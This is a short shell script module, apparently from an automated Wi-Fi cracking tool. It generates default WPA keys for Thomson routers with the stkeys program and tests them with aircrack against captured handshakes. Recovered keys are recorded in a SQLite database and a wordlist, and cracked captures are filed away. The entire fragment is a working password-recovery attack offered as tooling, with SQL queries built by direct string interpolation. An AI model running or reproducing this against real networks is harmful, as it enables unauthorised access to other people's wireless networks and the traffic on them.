# this module uses the compiled binary of Kevin Devine's stkeys.c (https://packetstormsecurity.com/files/84788/STKeys-Thomson-WPA-Key-Recovery-Tool-1.0.html)
# generate keys
ST_BIN=$(which st)
$($ST_BIN -o "$path"wlthomson -i $tessid)
# test keys
psk=$("$AIRCRACK_BIN" "$path$hs$bssid"*.cap -w "$path"wlthomson 2>/dev/null | grep FOUND | grep -oE '[0-9a-f]{10}' | sort -u)
"$SQLITE3_BIN" "$path$db" "UPDATE captures SET processed = 1 WHERE bssid = '$bssid';" 2>/dev/null
rm -f "$path"wl* 2>/dev/null
if [ ${#psk} -gt 7 ]; then
  echo "Key $psk found for BSSID $bssid"
  "$SQLITE3_BIN" "$path$db" "UPDATE captures SET psk = '$psk' WHERE bssid = '$bssid';" 2>/dev/null
  echo "$psk" >>"$path$wl"known
  mv "$path$hs$bssid"* "$path$hs".cracked/ 2>/dev/null
  continue
fi
